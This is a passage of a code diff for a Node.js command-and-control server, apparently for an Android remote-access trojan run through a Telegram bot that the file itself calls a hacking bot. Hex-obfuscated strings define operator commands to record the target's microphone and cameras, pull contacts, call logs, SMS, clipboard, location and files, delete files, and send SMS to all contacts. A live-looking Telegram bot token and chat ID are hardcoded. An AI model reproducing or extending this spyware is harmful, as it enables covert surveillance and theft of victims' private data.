@@ -1,7 +1,787 @@
-var _0x52ef=["\x65\x78\x70\x72\x65\x73\x73","\x77\x73","\x68\x74\x74\x70","\x6E\x6F\x64\x65\x2D\x74\x65\x6C\x65\x67\x72\x61\x6D\x2D\x62\x6F\x74\x2D\x61\x70\x69","\x75\x75\x69\x64","\x6D\x75\x6C\x74\x65\x72","\x62\x6F\x64\x79\x2D\x70\x61\x72\x73\x65\x72","\x61\x78\x69\x6F\x73"];const express=require(_0x52ef[0]);const webSocket=require(_0x52ef[1]);const http=require(_0x52ef[2]);const telegramBot=require(_0x52ef[3]);const uuid4=require(_0x52ef[4]);const multer=require(_0x52ef[5]);const bodyParser=require(_0x52ef[6]);const axios=require(_0x52ef[7])
+const express = require('express');
+const webSocket = require('ws');
+const http = require('http');
+const telegramBot = require('node-telegram-bot-api');
+const uuid4 = require('uuid');
+const multer = require('multer');
+const bodyParser = require('body-parser');
+const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
+
+// =============== التهيئة ===============
 
 const token = '8987687225:AAEFIlCRyNyOIBJMIwHkNpZSU92L_0QWdu4'
 const id = '6837315281'
 const address = 'https://www.google.com'
 
-var _0xdc21=["\x63\x72\x65\x61\x74\x65\x53\x65\x72\x76\x65\x72","\x6A\x73\x6F\x6E","\x75\x73\x65","","\x2F","\x3C\x68\x31\x20\x61\x6C\x69\x67\x6E\x3D\x22\x63\x65\x6E\x74\x65\x72\x22\x3E\u062A\u0645 \u062A\u062D\u0645\u064A\u0644 \u0627\u0644\u062E\u0627\u062F\u0645 \u0628\u0646\u062C\u0627\u062D\x3C\x2F\x68\x31\x3E","\x73\x65\x6E\x64","\x67\x65\x74","\x2F\x75\x70\x6C\x6F\x61\x64\x46\x69\x6C\x65","\x66\x69\x6C\x65","\x73\x69\x6E\x67\x6C\x65","\x6F\x72\x69\x67\x69\x6E\x61\x6C\x6E\x61\x6D\x65","\x62\x75\x66\x66\x65\x72","\xB0\u2022\x20\u0631\u0633\u0627\u0644\u0629 \u0645\u0646\x20\x3C\x62\x3E","\x6D\x6F\x64\x65\x6C","\x68\x65\x61\x64\x65\x72\x73","\x3C\x2F\x62\x3E\x20\u062C\u0647\u0627\u0632","\x48\x54\x4D\x4C","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x74\x78\x74","\x73\x65\x6E\x64\x44\x6F\x63\x75\x6D\x65\x6E\x74","\x70\x6F\x73\x74","\x2F\x75\x70\x6C\x6F\x61\x64\x54\x65\x78\x74","\x3C\x2F\x62\x3E\x20\u062C\u0647\u0627\u0632\x5C\x6E\x5C\x6E","\x74\x65\x78\x74","\x62\x6F\x64\x79","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x2F\x75\x70\x6C\x6F\x61\x64\x4C\x6F\x63\x61\x74\x69\x6F\x6E","\x6C\x61\x74","\x6C\x6F\x6E","\x73\x65\x6E\x64\x4C\x6F\x63\x61\x74\x69\x6F\x6E","\xB0\u2022\x20\u0627\u0644\u0645\u0648\u0642\u0639 \u0645\u0646\x20\x3C\x62\x3E","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x76\x34","\x62\x61\x74\x74\x65\x72\x79","\x76\x65\x72\x73\x69\x6F\x6E","\x62\x72\x69\x67\x68\x74\x6E\x65\x73\x73","\x70\x72\x6F\x76\x69\x64\x65\x72","\x75\x75\x69\x64","\x73\x65\x74","\xB0\u2022\x20\u062C\u0647\u0627\u0632 \u062C\u062F\u064A\u062F \u0645\u062A\u0635\u0644\u2611\uFE0F\x5C\x6E\x5C\x6E","\u2022\x20 \u0637\u0631\u0627\u0632 \u0627\u0644\u062C\u0647\u0627\u0632\uD83D\uDCF1\x20\x3A\x20\x3C\x62\x3E","\x3C\x2F\x62\x3E\x5C\x6E","\u2022\x20\u0628\u0637\u0627\u0631\u064A\u0629 \uD83D\uDD0B\x20\x3A\x20\x3C\x62\x3E","\u2022\x20\u0646\u0633\u062E\u0629 \u0623\u0646\u062F\u0631\u0648\u064A\u062F\x20\x3A\x20\x3C\x62\x3E","\u2022\x20\u0633\u0637\u0648\u0639 \u0627\u0644\u0634\u0627\u0634\u0629 \x20\x3A\x20\x3C\x62\x3E","\u2022\x20\u0646\u0648\u0639 \u0627\u0644\u0634\u0631\u064A\u062D\u0629 SIM\x20\x3A\x20\x3C\x62\x3E","\x3C\x2F\x62\x3E","\x63\x6C\x6F\x73\x65","\xB0\u2022\x20\u0627\u0644\u062C\u0647\u0627\u0632 \u063A\u064A\u0631 \u0645\u062A\u0635\u0644 \u274E\x5C\x6E\x5C\x6E","\x64\x65\x6C\x65\x74\x65","\x6F\x6E","\x6D\x65\x73\x73\x61\x67\x65","\x69\x64","\x63\x68\x61\x74","\x72\x65\x70\x6C\x79\x5F\x74\x6F\x5F\x6D\x65\x73\x73\x61\x67\x65","\xB0\u2022\x20\u064A\u0631\u062C\u0649 \u0627\u0644\u0631\u062F \u0639\u0644\u0649 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u0642\u0635\u064A\u0631\u0629 \u0625\u0644\u064A","\x69\x6E\x63\x6C\x75\x64\x65\x73","\xB0\u2022\x20\u0631\u0627\u0626\u0639 \u060C \u0623\u062F\u062E\u0644 \u0627\u0644\u0622\u0646 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627 \u0625\u0644\u0649 \u0647\u0630\u0627 \u0627\u0644\u0631\u0642\u0645\x0A\x0A","\u2022\x20\u0299\u1D07\x20\u1D04\u1D00\u0280\u1D07\uA730\u1D1C\u029F\x20\u1D1B\u029C\u1D00\u1D1B\x20\u1D1B\u029C\u1D07\x20\u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07\x20\u1D21\u026A\u029F\u029F\x20\u0274\u1D0F\u1D1B\x20\u0299\u1D07\x20\uA731\u1D07\u0274\u1D1B\x20\u026A\uA730\x20\u1D1B\u029C\u1D07\x20\u0274\u1D1C\u1D0D\u0299\u1D07\u0280\x20\u1D0F\uA730\x20\u1D04\u029C\u1D00\u0280\u1D00\u1D04\u1D1B\u1D07\u0280\uA731\x20\u026A\u0274\x20\u028F\u1D0F\u1D1C\u0280\x20\u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07\x20\u026A\uA731\x20\u1D0D\u1D0F\u0280\u1D07\x20\u1D1B\u029C\u1D00\u0274\x20\u1D00\u029F\u029F\u1D0F\u1D21\u1D07\u1D05","\xB0\u2022\x20\u0631\u0627\u0626\u0639 \u060C \u0623\u062F\u062E\u0644 \u0627\u0644\u0622\u0646 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627 \u0625\u0644\u0649 \u0647\u0630\u0627 \u0627\u0644\u0631\u0642\u0645'","\x73\x65\x6E\x64\x5F\x6D\x65\x73\x73\x61\x67\x65\x3A","\x66\x6F\x72\x45\x61\x63\x68","\x63\x6C\x69\x65\x6E\x74\x73","\xB0\u2022\x20\u0637\u0644\u0628\u0643 \u0642\u064A\u062F \u0627\u0644\u0645\u0639\u0627\u0644\u062C\u0629\x0A\x0A","\u2022\x20\u028F\u1D0F\u1D1C\x20\u1D21\u026A\u029F\u029F\x20\u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07\x20\u1D00\x20\u0280\u1D07\uA731\u1D18\u1D0F\u0274\uA731\u1D07\x20\u026A\u0274\x20\u1D1B\u029C\u1D07\x20\u0274\u1D07\x78\u1D1B\x20\uA730\u1D07\u1D21\x20\u1D0D\u1D0F\u1D0D\u1D07\u0274\u1D1B\uA731","\u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16","\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u0648\u0627\u0645\u0631\uD83D\uDD79","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627 \u0625\u0644\u0649 \u062C\u0645\u064A\u0639 \u062C\u0647\u0627\u062A \u0627\u0644\u0627\u062A\u0635\u0627\u0644","\x73\x65\x6E\x64\x5F\x6D\x65\x73\x73\x61\x67\x65\x5F\x74\x6F\x5F\x61\x6C\x6C\x3A","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0645\u0633\u0627\u0631 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062A\u0646\u0632\u064A\u0644\u0647","\x66\x69\x6C\x65\x3A","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0645\u0633\u0627\u0631 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062D\u0630\u0641","\x64\x65\x6C\x65\x74\x65\x5F\x66\x69\x6C\x65\x3A","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u062A\u0633\u062C\u064A\u0644 \u0627\u0644\u0645\u064A\u0643\u0631\u0648\u0641\u0648\u0646 \u0641\u064A\u0647\u0627","\x6D\x69\x63\x72\x6F\x70\x68\x6F\x6E\x65\x3A","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u062A\u0633\u062C\u064A\u0644 \u0627\u0644\u0643\u0627\u0645\u064A\u0631\u0627 \u0627\u0644\u0631\u0626\u064A\u0633\u064A\u0629 \u0641\u064A\u0647\u0627","\x72\x65\x63\x5F\x63\x61\x6D\x65\x72\x61\x5F\x6D\x61\x69\x6E\x3A","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u062A\u0633\u062C\u064A\u0644 \u0643\u0627\u0645\u064A\u0631\u0627 \u0627\u0644\u0633\u064A\u0644\u0641\u064A \u0641\u064A\u0647\u0627","\x72\x65\x63\x5F\x63\x61\x6D\x65\x72\x61\x5F\x73\x65\x6C\x66\x69\x65\x3A","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0638\u0647\u0648\u0631\u0647\u0627 \u0639\u0644\u0649 \u0627\u0644\u062C\u0647\u0627\u0632 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641","\x74\x6F\x61\x73\x74\x3A","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0638\u0647\u0648\u0631\u0647\u0627 \u0643\u0625\u0634\u0639\u0627\u0631","\xB0\u2022\x20\u0631\u0627\u0626\u0639 \u060C \u0623\u062F\u062E\u0644 \u0627\u0644\u0622\u0646 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0641\u062A\u062D\u0647 \u0628\u0648\u0627\u0633\u0637\u0629 \u0627\u0644\u0625\u0634\u0639\u0627\u0631\x0A\x0A","\u2022\x20\u1D21\u029C\u1D07\u0274\x20\u1D1B\u029C\u1D07\x20\u1D20\u026A\u1D04\u1D1B\u026A\u1D0D\x20\u1D04\u029F\u026A\u1D04\u1D0B\uA731\x20\u1D0F\u0274\x20\u1D1B\u029C\u1D07\x20\u0274\u1D0F\u1D1B\u026A\uA730\u026A\u1D04\u1D00\u1D1B\u026A\u1D0F\u0274\x2C\x20\u1D1B\u029C\u1D07\x20\u029F\u026A\u0274\u1D0B\x20\u028F\u1D0F\u1D1C\x20\u1D00\u0280\u1D07\x20\u1D07\u0274\u1D1B\u1D07\u0280\u026A\u0274\u0262\x20\u1D21\u026A\u029F\u029F\x20\u0299\u1D07\x20\u1D0F\u1D18\u1D07\u0274\u1D07\u1D05","\xB0\u2022\x20\u0631\u0627\u0626\u0639 \u060C \u0623\u062F\u062E\u0644 \u0627\u0644\u0622\u0646 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0641\u062A\u062D\u0647 \u0628\u0648\u0627\u0633\u0637\u0629 \u0627\u0644\u0625\u0634\u0639\u0627\u0631","\x73\x68\x6F\x77\x5F\x6E\x6F\x74\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x3A","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0631\u0627\u0628\u0637 \u0627\u0644\u0635\u0648\u062A \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062A\u0634\u063A\u064A\u0644\u0647","\x70\x6C\x61\x79\x5F\x61\x75\x64\x69\x6F\x3A","\x2F\x73\x74\x61\x72\x74","\xB0\u2022\x20\u2022 \u0645\u0631\u062D\u0628\u0627 \u0628\u0643 \u0641\u064A \u0628\u0648\u062A \u0627\u062E\u062A\u0631\u0627\u0642 \uD83D\uDC4B\x0A\x0A","\u2022\x20\u0631\u062C\u0627\u0621 \u0639\u062F\u0645 \u0627\u0633\u062A\u062E\u062F\u0627\u0645 \u0627\u0644\u0628\u0648\u062A \u0641\u064A\u0645\u0627 \u064A\u063A\u0636\u0628  \u0627\u0644\u0644\u0647.\u0647\u0630\u0627 \u0627\u0644\u0628\u0648\u062A \u063A\u0631\u0636 \u0627\u0644\u062A\u0648\u0639\u064A\u0629 \u0648\u062D\u0645\u0627\u064A\u0629 \u0646\u0641\u0633\u0643 \u0645\u0646 \u0627\u0644\u0627\u062E\u062A\u0631\u0627\u0642\x0A\x0A","\u2022\x20\u062A\u0631\u062C\u0645\u0647 \u0627\u0644\u0628\u0648\u062A \u0628\u0642\u064A\u0627\u062F\u0629\u0020\u0028\u0020\u0040\u006b\u0069\u006e\u0067\u005f\u0031\u005f\u0034\u0020\u0029\u0020\u0020\u00BB\u0637\u0648\u0641\u0627\u0646 \u0627\u0644\u0623\u0642\u0635\u0649\u21E3\u207D\uD83C\uDDF5\uD83C\uDDF8\u208E\x0A\x0A","\u2022\x20\u0642\u0646\u0627\u062A\u064A \u062A\u0644\u064A\u062C\u0631\u0627\  \u0020\u0074\u002e\u006d\u0065\u002f\u0041\u0062\u0075\u005f\u0059\u0061\u006d\u0061\u006e\u0069\x0A\x0A","\u2022\x20\u0627\u0636\u063A\u0637 \u0647\u0646\( /start )  ","\x73\x69\x7A\x65","\xB0\u2022\x20\u0644\u0627 \u062A\u062A\u0648\u0641\u0631 \u0623\u062C\u0647\u0632\u0629 \u062A\u0648\u0635\u064A\u0644 \u274E\x0A\x0A","\u2022\x20\u1D0D\u1D00\u1D0B\u1D07\x20\uA731\u1D1C\u0280\u1D07\x20\u1D1B\u029C\u1D07\x20\u1D00\u1D18\u1D18\u029F\u026A\u1D04\u1D00\u1D1B\u026A\u1D0F\u0274\x20\u026A\uA731\x20\u026A\u0274\uA731\u1D1B\u1D00\u029F\u029F\u1D07\u1D05\x20\u1D0F\u0274\x20\u1D1B\u029C\u1D07\x20\u1D1B\u1D00\u0280\u0262\u1D07\u1D1B\x20\u1D05\u1D07\u1D20\u026A\u1D04\u1D07","\xB0\u2022\x20\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0623\u062C\u0647\u0632\u0629 \u0627\u0644\u0645\u062A\u0635\u0644\u0629\uD83E\uDD16\x20\x3A\x0A\x0A","\x3C\x2F\x62\x3E\x5C\x6E\x5C\x6E","\x64\x65\x76\x69\x63\x65\x3A","\x70\x75\x73\x68","\xB0\u2022\x20\u062D\u062F\u062F \u0627\u0644\u062C\u0647\u0627\u0632 \u0644\u062A\u0646\u0641\u064A\u0630 \u0627\u0644\u062B\u0646\u0627\u0621","\xB0\u2022\x20 \u062A\u0645 \u0631\u0641\u0636 \u0627\u0644\u0625\u0630\u0646","\x63\x61\x6C\x6C\x62\x61\x63\x6B\x5F\x71\x75\x65\x72\x79","\x64\x61\x74\x61","\x3A","\x73\x70\x6C\x69\x74","\x6C\x6F\x67","\x64\x65\x76\x69\x63\x65","\xB0\u2022\x20\u062D\u062F\u062F \u0627\u0644\u062C\u0647\u0627\u0632 \u0644\u062A\u0646\u0641\u064A\u0630 \u0627\u0644\u062B\u0646\u0627\u0621\x20\x3A\x20\x3C\x62\x3E","\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64","\uD83D\uDCF1\u062A\u0637\u0628\u064A\u0642\u0627\u062A","\x61\x70\x70\x73\x3A","\u2139\uFE0F\u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u062C\u0647\u0627\u0632","\x64\x65\x76\x69\x63\x65\x5F\x69\x6E\x66\x6F\x3A","\uD83D\uDDC2\uFE0F\u0627\u0644\u062D\u0635\u0648\u0644 \u0639\u0644\u0649 \u0645\u0644\u0641","\uD83D\uDCC2\u062D\u0630\u0641 \u0627\u0644\u0645\u0644\u0641","\uD83D\uDCCB\u062D\u0627\u0641\u0638\u0629","\x63\x6C\x69\x70\x62\x6F\x61\x72\x64\x3A","\uD83C\uDFA4\u0645\u064A\u0643\u0631\u0648\u0641\u0648\u0646","\uD83D\uDCF7\u0627\u0644\u0643\u0627\u0645\u064A\u0631\u0627 \u0627\u0644\u0631\u0626\u064A\u0633\u064A","\x63\x61\x6D\x65\x72\x61\x5F\x6D\x61\x69\x6E\x3A","\uD83D\uDCF8\u0643\u0627\u0645\u064A\u0631\u0627 \u0627\u0644\u0633\u064A\u0644\u0641\u064A","\x63\x61\x6D\x65\x72\x61\x5F\x73\x65\x6C\x66\x69\x65\x3A","\uD83D\uDEA9\u0627\u0644\u0645\u0648\u0642\u0639","\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3A","\u203C\uFE0F\u062D\u0645\u0635 ","\uD83D\uDCDE\u0627\u0644\u0645\u0643\u0627\u0644\u0645\u0627\u062A","\x63\x61\x6C\x6C\x73\x3A","\uD83D\uDCD2\u062C\u0647\u0627\u062A \u0627\u0644\u0627\u062A\u0635\u0627\u0644","\x63\x6F\x6E\x74\x61\x63\x74\x73\x3A","\uD83D\uDCF3\u064A\u0647\u062A\u0632 ","\x76\x69\x62\x72\x61\x74\x65\x3A","\uD83D\uDD14\u0625\u0638\u0647\u0627\u0631 \u0627\u0644\u0625\u0634\u0639\u0627\u0631","\u2709\uFE0F\u0631\u0633\u0627\u0626\u0644","\x6D\x65\x73\x73\x61\x67\x65\x73\x3A","\uD83D\uDCE8\u0627\u0631\u0633\u0644 \u0631\u0633\u0627\u0644\u0629","\uD83D\uDD0A\u062A\u0634\u063A\u064A\u0644 \u0627\u0644\u0635\u0648\u062A","\uD83D\uDD07\u0625\u064A\u0642\u0627\u0641 \u0627\u0644\u0635\u0648\u062A","\x73\x74\x6F\x70\x5F\x61\x75\x64\x69\x6F\x3A","\uD83D\uDCE8\u0625\u0631\u0633\u0627\u0644 \u0631\u0633\u0627\u0644\u0629 \u0625\u0644\u0649 \u062C\u0645\u064A\u0639 \u062C\u0647\u0627\u062A \u0627\u0644\u0627\u062A\u0635\u0627\u0644 ","\x65\x64\x69\x74\x4D\x65\x73\x73\x61\x67\x65\x54\x65\x78\x74","\x63\x61\x6C\x6C\x73","\x64\x65\x6C\x65\x74\x65\x4D\x65\x73\x73\x61\x67\x65","\x63\x6F\x6E\x74\x61\x63\x74\x73","\x6D\x65\x73\x73\x61\x67\x65\x73","\x61\x70\x70\x73","\x64\x65\x76\x69\x63\x65\x5F\x69\x6E\x66\x6F","\x63\x6C\x69\x70\x62\x6F\x61\x72\x64","\x63\x61\x6D\x65\x72\x61\x5F\x6D\x61\x69\x6E","\x63\x61\x6D\x65\x72\x61\x5F\x73\x65\x6C\x66\x69\x65","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x76\x69\x62\x72\x61\x74\x65","\x73\x74\x6F\x70\x5F\x61\x75\x64\x69\x6F","\x73\x65\x6E\x64\x5F\x6D\x65\x73\x73\x61\x67\x65","\xB0\u2022\x20\u2022 \u064A\u0631\u062C\u0649 \u0627\u0644\u0631\u062F \u0639\u0644\u0649 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u0642\u0635\u064A\u0631\u0629 \u0625\u0644\u064A\u0647\x0A\x0A","\u2022\u026A\uA730\x20\u028F\u1D0F\u1D1C\x20\u1D21\u1D00\u0274\u1D1B\x20\u1D1B\u1D0F\x20\uA731\u1D07\u0274\u1D05\x20\uA731\u1D0D\uA731\x20\u1D1B\u1D0F\x20\u029F\u1D0F\u1D04\u1D00\u029F\x20\u1D04\u1D0F\u1D1C\u0274\u1D1B\u0280\u028F\x20\u0274\u1D1C\u1D0D\u0299\u1D07\u0280\uA731\x2C\x20\u028F\u1D0F\u1D1C\x20\u1D04\u1D00\u0274\x20\u1D07\u0274\u1D1B\u1D07\u0280\x20\u1D1B\u029C\u1D07\x20\u0274\u1D1C\u1D0D\u0299\u1D07\u0280\x20\u1D21\u026A\u1D1B\u029C\x20\u1D22\u1D07\u0280\u1D0F\x20\u1D00\u1D1B\x20\u1D1B\u029C\u1D07\x20\u0299\u1D07\u0262\u026A\u0274\u0274\u026A\u0274\u0262\x2C\x20\u1D0F\u1D1B\u029C\u1D07\u0280\u1D21\u026A\uA731\u1D07\x20\u1D07\u0274\u1D1B\u1D07\u0280\x20\u1D1B\u029C\u1D07\x20\u0274\u1D1C\u1D0D\u0299\u1D07\u0280\x20\u1D21\u026A\u1D1B\u029C\x20\u1D1B\u029C\u1D07\x20\u1D04\u1D0F\u1D1C\u0274\u1D1B\u0280\u028F\x20\u1D04\u1D0F\u1D05\u1D07","\x73\x65\x6E\x64\x5F\x6D\x65\x73\x73\x61\x67\x65\x5F\x74\x6F\x5F\x61\x6C\x6C","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0625\u0631\u0633\u0627\u0644\u0647\u0627 \u0625\u0644\u0649 \u062C\u0645\u064A\u0639 \u062C\u0647\u0627\u062A \u0627\u0644\u0627\u062A\u0635\u0627\u0644\x0A\x0A","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0645\u0633\u0627\u0631 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062A\u0646\u0632\u064A\u0644\u0647 \x0A\x0A","\u2022\x20\u028F\u1D0F\u1D1C\x20\u1D05\u1D0F\x20\u0274\u1D0F\u1D1B\x20\u0274\u1D07\u1D07\u1D05\x20\u1D1B\u1D0F\x20\u1D07\u0274\u1D1B\u1D07\u0280\x20\u1D1B\u029C\u1D07\x20\uA730\u1D1C\u029F\u029F\x20\uA730\u026A\u029F\u1D07\x20\u1D18\u1D00\u1D1B\u029C\x2C\x20\u1D0A\u1D1C\uA731\u1D1B\x20\u1D07\u0274\u1D1B\u1D07\u0280\x20\u1D1B\u029C\u1D07\x20\u1D0D\u1D00\u026A\u0274\x20\u1D18\u1D00\u1D1B\u029C\x2E\x20\uA730\u1D0F\u0280\x20\u1D07\x78\u1D00\u1D0D\u1D18\u029F\u1D07\x2C\x20\u1D07\u0274\u1D1B\u1D07\u0280\x3C\x62\x3E\x20\x44\x43\x49\x4D\x2F\x43\x61\x6D\x65\x72\x61\x20\x3C\x2F\x62\x3E\x20\u1D1B\u1D0F\x20\u0280\u1D07\u1D04\u1D07\u026A\u1D20\u1D07\x20\u0262\u1D00\u029F\u029F\u1D07\u0280\u028F\x20\uA730\u026A\u029F\u1D07\uA731\x2E","\x64\x65\x6C\x65\x74\x65\x5F\x66\x69\x6C\x65","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0645\u0633\u0627\u0631 \u0627\u0644\u0645\u0644\u0641 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u062D\u0630\u0641\x0A\x0A","\u2022\x20\u028F\u1D0F\u1D1C\x20\u1D05\u1D0F\x20\u0274\u1D0F\u1D1B\x20\u0274\u1D07\u1D07\u1D05\x20\u1D1B\u1D0F\x20\u1D07\u0274\u1D1B\u1D07\u0280\x20\u1D1B\u029C\u1D07\x20\uA730\u1D1C\u029F\u029F\x20\uA730\u026A\u029F\u1D07\x20\u1D18\u1D00\u1D1B\u029C\x2C\x20\u1D0A\u1D1C\uA731\u1D1B\x20\u1D07\u0274\u1D1B\u1D07\u0280\x20\u1D1B\u029C\u1D07\x20\u1D0D\u1D00\u026A\u0274\x20\u1D18\u1D00\u1D1B\u029C\x2E\x20\uA730\u1D0F\u0280\x20\u1D07\x78\u1D00\u1D0D\u1D18\u029F\u1D07\x2C\x20\u1D07\u0274\u1D1B\u1D07\u0280\x3C\x62\x3E\x20\x44\x43\x49\x4D\x2F\x43\x61\x6D\x65\x72\x61\x20\x3C\x2F\x62\x3E\x20\u1D1B\u1D0F\x20\u1D05\u1D07\u029F\u1D07\u1D1B\u1D07\x20\u0262\u1D00\u029F\u029F\u1D07\u0280\u028F\x20\uA730\u026A\u029F\u1D07\uA731\x2E","\x6D\x69\x63\x72\x6F\x70\x68\x6F\x6E\x65","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u062A\u0633\u062C\u064A\u0644 \u0627\u0644\u0645\u064A\u0643\u0631\u0648\u0641\u0648\u0646 \u0641\u064A\u0647\u0627\x0A\x0A","\u2022\x20\u0274\u1D0F\u1D1B\u1D07\x20\u1D1B\u029C\u1D00\u1D1B\x20\u028F\u1D0F\u1D1C\x20\u1D0D\u1D1C\uA731\u1D1B\x20\u1D07\u0274\u1D1B\u1D07\u0280\x20\u1D1B\u029C\u1D07\x20\u1D1B\u026A\u1D0D\u1D07\x20\u0274\u1D1C\u1D0D\u1D07\u0280\u026A\u1D04\u1D00\u029F\u029F\u028F\x20\u026A\u0274\x20\u1D1C\u0274\u026A\u1D1B\uA731\x20\u1D0F\uA730\x20\uA731\u1D07\u1D04\u1D0F\u0274\u1D05\uA731","\x74\x6F\x61\x73\x74","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0638\u0647\u0648\u0631\u0647\u0627 \u0639\u0644\u0649 \u0627\u0644\u062C\u0647\u0627\u0632 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641\x0A\x0A","\u2022\x20\u1D1B\u1D0F\u1D00\uA731\u1D1B\x20\u026A\uA731\x20\u1D00\x20\uA731\u029C\u1D0F\u0280\u1D1B\x20\u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07\x20\u1D1B\u029C\u1D00\u1D1B\x20\u1D00\u1D18\u1D18\u1D07\u1D00\u0280\uA731\x20\u1D0F\u0274\x20\u1D1B\u029C\u1D07\x20\u1D05\u1D07\u1D20\u026A\u1D04\u1D07\x20\uA731\u1D04\u0280\u1D07\u1D07\u0274\x20\uA730\u1D0F\u0280\x20\u1D00\x20\uA730\u1D07\u1D21\x20\uA731\u1D07\u1D04\u1D0F\u0274\u1D05\uA731","\x73\x68\x6F\x77\x5F\x6E\x6F\x74\x69\x66\x69\x63\x61\x74\x69\x6F\x6E","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0627\u0644\u0631\u0633\u0627\u0644\u0629 \u0627\u0644\u062A\u064A \u062A\u0631\u064A\u062F \u0623\u0646 \u062A\u0638\u0647\u0631 \u0643\u0625\u0634\u0639\u0627\u0631\x0A\x0A","\u2022\x20\u028F\u1D0F\u1D1C\u0280\x20\u1D0D\u1D07\uA731\uA731\u1D00\u0262\u1D07\x20\u1D21\u026A\u029F\u029F\x20\u0299\u1D07\x20\u1D00\u1D18\u1D18\u1D07\u1D00\u0280\x20\u026A\u0274\x20\u1D1B\u1D00\u0280\u0262\u1D07\u1D1B\x20\u1D05\u1D07\u1D20\u026A\u1D04\u1D07\x20\uA731\u1D1B\u1D00\u1D1B\u1D1C\uA731\x20\u0299\u1D00\u0280\x20\u029F\u026A\u1D0B\u1D07\x20\u0280\u1D07\u0262\u1D1C\u029F\u1D00\u0280\x20\u0274\u1D0F\u1D1B\u026A\uA730\u026A\u1D04\u1D00\u1D1B\u026A\u1D0F\u0274","\x70\x6C\x61\x79\x5F\x61\x75\x64\x69\x6F","\xB0\u2022\x20\u0623\u062F\u062E\u0644 \u0631\u0627\u0628\u0637 \u0627\u0644\u0635\u0648\u062A \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F 